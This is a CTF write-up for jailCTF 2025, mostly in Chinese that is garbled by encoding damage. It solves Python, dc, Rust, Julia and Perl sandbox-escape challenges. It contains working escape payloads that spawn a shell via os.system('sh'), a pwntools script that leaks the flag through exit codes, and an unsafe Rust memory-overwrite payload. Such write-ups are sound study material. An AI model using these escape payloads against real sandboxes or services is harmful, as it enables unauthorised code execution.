#+TITLE: jailCTF 2025 writeup
#+DATE: <2025-10-07 Tue>

* Day 1
** ASMaaS
#+BEGIN_SRC asm
#include "flag.txt"
    or
.incbin "flag.txt"
#+END_SRC

** blindness
[[https://skyi23.github.io/2025/08/12/Python æ²™ç®±é€ƒé€¸][Python æ²™ç®±é€ƒé€¸æŠ€æœ¯åˆé›†]]
#+BEGIN_SRC python
().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['print'](flag, file=().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['__import__']('sys').stderr)
#+END_SRC
è¿‡äºç®€å•ï¼Œæ‡’å¾—è§£é‡Š

** impossible
è§£é¢˜&WP by @ishland

#+BEGIN_SRC python
eval(''.join(c for c in input('> ') if c in "abcdefghijklmnopqrstuvwxyz:_.[]"))
#+END_SRC

æ²¡æœ‰å°æ‹¬å·ä¸èƒ½ç›´æ¥æ„é€ å‡½æ•°è°ƒç”¨ï¼Œæ²¡æœ‰å¼•å·ä¹Ÿä¸èƒ½ç›´æ¥æ„é€ å­—ç¬¦ä¸²å¸¸é‡
=__repr__= ä¸èƒ½ç›´æ¥ç”¨ï¼Œå› ä¸ºæœ€åçš„å¹¶æ²¡æœ‰printï¼Œé™¤éæ‰‹åŠ¨æ„é€ ä¸€ä¸ª
è€ƒè™‘ =__getattribute__=, =obj.attr= ä¼šå˜æˆ =obj.__class__.__getattribute__("attr")=
ç„¶åå°±æ˜¯æ‰¾ä¸¤ä¸ªä¸œè¥¿ï¼Œè¿™é‡Œæ‰¾äº† license å’Œ help
æ„é€  =__import__("os").system("sh")=

#+BEGIN_SRC python
license.__class__.__getattribute__ = __import__
help.__class__.__getattribute__ = license.os.system
#+END_SRC

ä½¿ç”¨foræˆ‘ä¹Ÿä¸çŸ¥é“å«ä»€ä¹ˆçš„é‚£ç©æ„è¿›è¡Œå˜é‡èµ‹å€¼ï¼Œä»¥é¿å¼€ç­‰å·å’Œç©ºæ ¼è¿›è¡Œèµ‹å€¼
#+BEGIN_SRC python
[[license.os.system]for[license.__class__.__getattribute__]in[[__import__]]]
[[help.sh]for[help.__class__.__getattribute__]in[[license.os.system]]]
#+END_SRC

ç„¶åä¸²ä¸€ä¸‹
#+BEGIN_SRC python
[[[[help.sh]for[help.__class__.__getattribute__]in[[license.os.system]]]]for[license.__class__.__getattribute__]in[[__import__]]]
#+END_SRC
å³å¯getshell

** dcjail
å¹½é»˜ GNU
#+BEGIN_SRC python
import os

inp = input('> ')
if any(c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' for c in inp):  # they gave me no blue raspberry dawg
    print('bad. dont even try using lowercase z')
    exit(1)

with open('/tmp/code.txt', 'w') as f:
    f.write(inp)

os.system(f'/usr/bin/dc -f /tmp/code.txt')
print("stop. you're done. get out.")
#+END_SRC

å…ˆçœ‹ man! å‘ç°ä¸¤ä¸ªæŒ‡ä»¤ =!= =?= éƒ½å¯ä»¥å¯¼è‡´ RCE
#+BEGIN_EXAMPLE
?
    Reads a line from the terminal and executes it. This command allows a macro to request input from the user.
!
    Will run the rest of the line as a system command.
#+END_EXAMPLE
æ˜¾ç„¶è¿™ä¸¤ä¸ªéƒ½ä¸åœ¨ä¸Šé¢çš„å­—ç¬¦é‡Œ
ç„¶å GNU å¹½é»˜åœ°åŠ å…¥äº† =a= æŒ‡ä»¤å¯ä»¥ pop ä¸€ä¸ªæ•°å­— push ä¸€ä¸ª charï¼Œå³ä½¿ deprecated ä¹Ÿä¾æ—§ä¿ç•™
#+BEGIN_EXAMPLE
63ap
dc: warning: 'a' command is deprecated
        (contact <bug-dc@gnu.org> if you actually use it)
?
#+END_EXAMPLE
#+BEGIN_SRC c
	case 'a':	/* Convert top of stack to an ascii character. */
		if (dc_pop(&datum) == DC_SUCCESS){
			char tmps;
			if (datum.dc_type == DC_NUMBER){
				tmps = (char) dc_num2int(datum.v.number, DC_TOSS);
			}else if (datum.dc_type == DC_STRING){
				tmps = *dc_str2charp(datum.v.string);
				dc_free_str(&datum.v.string);
			}else{
				dc_garbage("at top of stack", -1);
			}
			dc_push(dc_makestring(&tmps, 1));
		}
		break;
#+END_SRC
=x= æŒ‡ä»¤å¯ä»¥ pop ä¸€ä¸ª string å½“ä½œ macro æ‰§è¡Œ
ç†è®ºæˆç«‹ï¼Œå®è·µå¼€å§‹ï¼

ç”±äºå­—ç¬¦é™åˆ¶ä¸èƒ½è¾“å…¥æ•°å­—ï¼Œä½†å¯ä»¥å¹³æ–¹å† =v= å¼€æ–¹ï¼Œä¸€æ¬¡ä¸è¡Œå°±ä¸¤æ¬¡
#+BEGIN_EXAMPLE
FAAAAAAvvap
?
#+END_EXAMPLE
æ‰€ä»¥ payload å°±æ˜¯ =FAAAAAAvvax=

* Day 2
** rustjail
è¿™é¢˜æ˜¯åŠé“æ‰å‡ºæ¥çš„ï¼Œæˆ‘ä¹Ÿæ˜¯é è¿™é¢˜æ‹¿ä¸‹çš„ *ç¬¬ 10 å*
#+BEGIN_SRC python
import string
import os

allowed = set(string.ascii_lowercase+string.digits+' :._(){}"')

os.environ['RUSTUP_HOME']='/usr/local/rustup'
os.environ['CARGO_HOME']='/usr/local/cargo'
os.environ['PATH']='/usr/local/cargo/bin:/usr/bin'

inp = input("gib cod: ").strip()
if not allowed.issuperset(set(inp)):
    print("bad cod")
    exit()
else:
    print(inp)
with open("/tmp/cod.rs", "w") as f:
    f.write(inp)
os.system("/usr/local/cargo/bin/rustc /tmp/cod.rs -o /tmp/cod")
os.system("/tmp/cod; echo Exited with status $?")
#+END_SRC
è¯•äº†ä¸€åœˆå‘ç°æ²¡æ³•ç›´æ¥è¾“å‡º flagï¼Œä½†æ˜¯æœ‰è¿”å›å€¼æ‰€ä»¥å¯ä»¥ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¹¦ã€‚
#+BEGIN_SRC python
from pwn import *

res = []

for i in range(40):
    io = remote('challs2.pyjail.club', 9999)
    payload = 'fn main() { std::process::exit(std::fs::read("flag.txt").unwrap().into_iter().nth(' + f'{i}' + ').unwrap().into()) }'
    io.sendlineafter('gib cod: ', payload)
    io.recvuntil('with status ')
    res.append(chr(int(io.recv())))
    print(''.join(res))
#+END_SRC

** calcdefanged
è§£é¢˜&WP by @ishland

é¢˜ç›®æ£€æŸ¥è¾“å…¥é•¿åº¦å°äº75ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º ~[0-9+\-*/]+~ ï¼Œç›´æ¥ç”¨ ~0,~ ç»•è¿‡å³å¯
é¢˜ç›®ä¸ŠåŠ å…¥audit hookä¹‹ååˆå¸è½½äº†ï¼Œåœ¨å¸è½½åæ‰æŠŠç»“æœè¿›è¡Œprintï¼Œè€ƒè™‘æ”»å‡» ~__repr__~

ç†è®ºä¸Šå¯ä»¥ä½¿ç”¨ä»»æ„mutable classï¼Œä¾‹å¦‚ ~help.__class__.__repr__~ ï¼Œ
ä½†æ˜¯é¢˜ç›®è¿‡æ»¤ç©ºæ ¼å’Œä¸‹åˆ’çº¿ï¼Œ ~__class__~ è¿™ç§å­—ç¬¦ä¸²è¦ç»§ç»­æ„é€ ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ ~license~ ï¼Œ
å› ä¸ºåŠ«æŒ ~license._Printer__setup~ å°±å¥½äº†ï¼Œé™ä½payloadè¿‡é•¿çš„å¯èƒ½æ€§

~_Printer__setup~ ä½¿ç”¨ ~dir(license)[5]~ ä»£æ›¿ï¼Œä½¿ç”¨ ~setattr(obj,str,any)~ ä»£æ›¿ ~license._Printer__setup = any~ èµ‹å€¼è¯­å¥ï¼Œ
æ‰”ä¸€ä¸ªlambdaè¿›å»å°±è§£å†³åœ¨audit hookå¸è½½åä»£ç æ‰§è¡Œé—®é¢˜

ä½†æ˜¯ä¸€è¡Œåšå®Œexploitä¸ç°å®ï¼Œä¸»è¦æ˜¯payloadé•¿åº¦é™åˆ¶ï¼Œè€ƒè™‘åŒæ­¥æ‰§è¡Œï¼Œä½¿ç”¨ ~eval(input())~ è§£å†³é—®é¢˜

#+BEGIN_SRC python
0,setattr(license,dir(license)[5],lambda:eval(input())),license
#+END_SRC

é•¿åº¦ä¸è¶…è¿‡75é™åˆ¶ï¼Œè¿›å»ä¹‹åæ‰” ~__import__("os").system("sh")~ å³å¯ï¼Œç„¶åå³å¯getshell

* Day 3
ä¸€é“é¢˜ä¹Ÿæ²¡æå‡ºæ¥

* ç»ˆ
æœ€é«˜æ’å 10ï¼Œæœ€ç»ˆæ’å 40ã€‚

çœ‹çœ‹åˆ«äººçš„ writeup é•¿é•¿è„‘å­å§

** rustjail
[[https://github.com/mirelgigel/writeupjailctf][@mirelgigel]]
#+BEGIN_SRC rust
fn main(){std::panic::panic_any(std::fs::read_to_string("flag.txt").unwrap())}
#+END_SRC

@toxicpie
ç›´æ¥ getshell äº†
#+BEGIN_SRC rust
fn main() {
    unsafe {
        true.then_some(
            true.then_some(0_u64)
                .as_mut_slice()
                .as_mut_ptr()
                .byte_add(0x50)
                .write(
                    true.then_some(0_u64)
                        .as_slice()
                        .as_ptr()
                        .byte_add(0x1e0)
                        .read()
                        .wrapping_add(0x1324c),
                ),
        )
        .is_some()
        .then_some(
            true.then_some(0_u64)
                .as_mut_slice()
                .as_mut_ptr()
                .byte_add(0x38)
                .write(0),
        )
        .is_some()
        .then_some(
            true.then_some(0_u64)
                .as_mut_slice()
                .as_mut_ptr()
                .byte_add(0x30)
                .write(
                    true.then_some(0_u64)
                        .as_slice()
                        .as_ptr()
                        .byte_add(0x1b0)
                        .read()
                        .wrapping_add(0x24eef),
                ),
        )
        .unwrap()
    }
}
#+END_SRC

** jailia
#+BEGIN_SRC julia
function check(ex)
    if ex isa Expr
        if ex.head in (:call, :macrocall, :.)
            println("bad expression: $(ex.head)")
            exit()
        end
        for arg in ex.args
            check(arg)
        end
    end
end

print("Input a Julia expression: ")
code = readline()
ex = Meta.parse(code)
check(ex)
eval(ex)
#+END_SRC
å°±æ˜¯ä¸ªæ“ä½œç¬¦é‡è½½ï¼Œå½“æ—¶æƒ³åˆ°ä½†æ²¡ç»†æƒ³ã€‚

** brainfudge
å‰ç½®çŸ¥è¯†
#+BEGIN_SRC python
>>> +True
1
>>> +False
0
>>> -True
-1
>>> ...
Ellipsis
#+END_SRC
@flocto
=--++[[[]]>[]][[]<[]]= å¯ä»¥ä»»æ„å åŠ äº§ç”Ÿ python æ•°å­—å¹¶ä¿æŒ bf çŠ¶æ€ä¸å˜
ç„¶åå°±å¯ä»¥å¾—å‡º 111 è§£æ³•

ç„¶åè¿˜æœ‰ä¸€ç§ =[[[]]]= è§£æ³•æš‚æ—¶æ²¡çœ‹æ‡‚

** stupÉªd si plÊŒs plÊŒs
#+BEGIN_SRC python
re.fullmatch(r'[a-z *;_]+', code)
#+END_SRC
[[https://cdn.discordapp.com/attachments/1424825718029811813/1424855320399974431/a.cpp?ex=68e5776c&is=68e425ec&hm=58d2e4ee81fdceca32b0b0af0dbb4ee054677778ba402e370c419da3256080e9&][@toxicpie]]
1. operators we can use: `*` (multiplication, pointers and dereferencing), bit operations (`bitand`, ...), bit+assign operations (`and_eq`, ...)
2. create 0 from xor, 1 and 2 from `sizeof`, 2^n from multiplying 2
3. create any constant by using `bit_or` on 2^n
4. can perform addition using bit operations and *2
5. use `extern unsigned long environ;` to obtain a pointer to somewhere on the stack
6. combine 3, 4 and 5 to obtain a pointer to the return address
7. use `extern unsigned long stdin;` to obtain a pointer to inside libc
8. combine 3, 4 and 7 to obtain some rop gadgets
9. ğŸ¤¯

** monkeval
#+BEGIN_SRC perl
$*OUT.out-buffer = False;
$*ERR.out-buffer = False;

# ğŸ™ˆğŸ™ˆğŸ™ˆ
sub MONKEY-SEE-NO-EVAL { 1 }

constant @allowed-charset = '()0123456789+-*/^~<=>$_ '.comb;

loop {
    my $input = prompt 'Enter a math expression: ';

    exit if $input eq 'exit';

    if $input.comb âŠˆ @allowed-charset {
        say 'Invalid expression!';
        next;
    }

    $_ = EVAL($input);
    say $_;
}
#+END_SRC

string xor + regex eval
çœ‹ä¸æ‡‚
